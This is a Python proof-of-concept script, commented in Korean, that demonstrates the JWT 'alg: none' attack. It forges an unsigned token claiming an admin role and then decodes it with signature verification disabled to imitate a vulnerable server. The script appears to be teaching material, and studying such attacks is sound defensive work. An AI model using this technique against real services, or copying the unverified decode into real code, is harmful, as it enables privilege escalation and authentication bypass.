import json
import base64

# PyJWT는 검증 시뮬레이션에만 사용
import jwt

def scenario_description():
    """공격 시나리오를 터미널에 출력."""
    print("="*50)
    print("⚔️ 공격 시나리오: 'alg: none' 서명 무력화 공격")
    print("="*50)
    print("JWT 표준은 서명 없이도 토큰을 사용할 수 있도록 'none' 알고리즘을 지원합니다.")
    print("만약 서버가 이 알고리즘을 비활성화하지 않았다면, 공격자는 서명을 제거한 위조 토큰을 보낼 수 있습니다.")
    print("\n1. 공격자는 유효한 토큰의 구조를 파악합니다.")
    print("2. 공격자는 헤더의 'alg' 값을 'none'으로 변경하고, 원하는 내용으로 페이로드를 위조합니다.")
    print("3. 서명(Signature) 부분을 비워둔 채로 토큰을 서버에 전송합니다.")
    print("4. 'none' 알고리즘을 허용하는 취약한 서버는 서명 검증 없이 페이로드 내용을 신뢰하게 됩니다.")
    print("-" * 50)

def base64url_encode(data):
    """데이터를 Base64URL 형식으로 인코딩."""
    return base64.urlsafe_b64encode(data).rstrip(b"=")

def run_poc():
    """개념 증명(Proof of Concept) 코드를 실행."""
    # 1. 악의적인 헤더와 페이로드 생성
    header = {"alg": "none", "typ": "JWT"}
    malicious_payload = {
        "sub": "super_admin@example.com",
        "role": "admin",
        "is_premium": True
    }
    print(f"[INFO] 1. 악의적인 헤더 및 페이로드 생성:\nHeader: {header}\nPayload: {malicious_payload}\n")

    # 2. 토큰의 각 부분을 인코딩
    json_header = json.dumps(header, separators=(",", ":")).encode('utf-8')
    json_payload = json.dumps(malicious_payload, separators=(",", ":")).encode('utf-8')

    encoded_header = base64url_encode(json_header)
    encoded_payload = base64url_encode(json_payload)

    # 3. 서명 부분을 의도적으로 비워서 토큰 조립
    # 형식: encoded_header.encoded_payload. 
    forged_token = (encoded_header + b"." + encoded_payload + b".").decode('utf-8')

    print(f"[SUCCESS] 2. 'alg:none' 토큰이 생성되었습니다:\n{forged_token}\n")
    print("[CONCLUSION] 이 토큰은 서명이 없지만, 'none' 알고리즘을 허용하는 서버에서는 유효한 것으로 처리될 수 있습니다.")
    print("   -> 최신 JWT 라이브러리는 기본적으로 'none' 알고리즘을 허용하지 않습니다.")

    # (참고) 취약한 서버에서의 검증 시뮬레이션
    try:
        # 'none' 알고리즘을 허용하도록 명시해야만 PyJWT가 디코딩을 시도.
        decoded_payload = jwt.decode(forged_token, options={"verify_signature": False})
        print("\n[SIMULATION] 'none'을 허용하는 취약한 서버가 토큰을 성공적으로 디코딩했습니다:")
        print(decoded_payload)
    except Exception as e:
        print(f"\n[SIMULATION] 디코딩이 예기치 않게 실패했습니다: {e}")

if __name__ == "__main__":
    scenario_description()
    run_poc()
